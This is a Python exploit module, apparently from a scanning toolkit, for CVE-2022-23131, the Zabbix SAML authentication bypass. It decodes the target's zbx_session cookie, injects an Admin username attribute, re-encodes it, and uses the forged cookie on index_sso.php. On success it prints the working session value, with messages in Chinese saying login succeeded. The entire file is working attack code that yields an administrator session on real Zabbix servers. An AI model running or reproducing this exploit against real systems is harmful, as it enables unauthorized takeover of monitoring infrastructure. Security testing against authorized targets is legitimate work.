#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import base64
from urllib.parse import unquote
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

class Cve_2022_23131:
    def get_url(self,input_url):
        try:
            requests.packages.urllib3.disable_warnings()
            reponse_get=requests.get(input_url,verify=self.ssl,headers=self.headers,proxies=self.proxy,timeout=10)
            cookie=reponse_get.cookies["zbx_session"]
            decode_cookie=base64.b64decode(unquote(cookie))
            str_cookie=str(decode_cookie,'utf-8')
            new_cookie="""{"saml_data":{"username_attribute":"Admin"},"""+str_cookie[1:]
            b_newcookie=base64.b64encode(new_cookie.encode('utf-8'))
            n_newcookie=str(b_newcookie,'utf-8')
            new_headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
            "Cookie":"zbx_session="+n_newcookie
            }

            requests.packages.urllib3.disable_warnings()

            new_url=requests.get(input_url+"index_sso.php",headers=new_headers,verify=self.ssl,proxies=self.proxy,timeout=10)
            if "action=dashboard.view" in new_url.text:
                OutPrintInfo("Zabbix",f"生成的zbx_session值为：[b bright_red]{n_newcookie}[/b bright_red]")
                OutPrintInfo("Zabbix",'[b bright_red]存在漏洞!登录成功[/b bright_red]')
            else:
                OutPrintInfo("Zabbix",f'目标 {input_url} 不存在漏洞')
        except Exception as e:
            OutPrintInfo("Zabbix",f'目标 {input_url} 不存在漏洞')
            return


    def main(self,target):
        url = target[0].strip('/ ')
        header = target[1]
        self.ssl = target[2]
        proxy = target[3]
        req = ReqSet(header=header,proxy=proxy)
        self.headers = req["header"]
        self.proxy = req["proxy"]
        self.get_url(url)

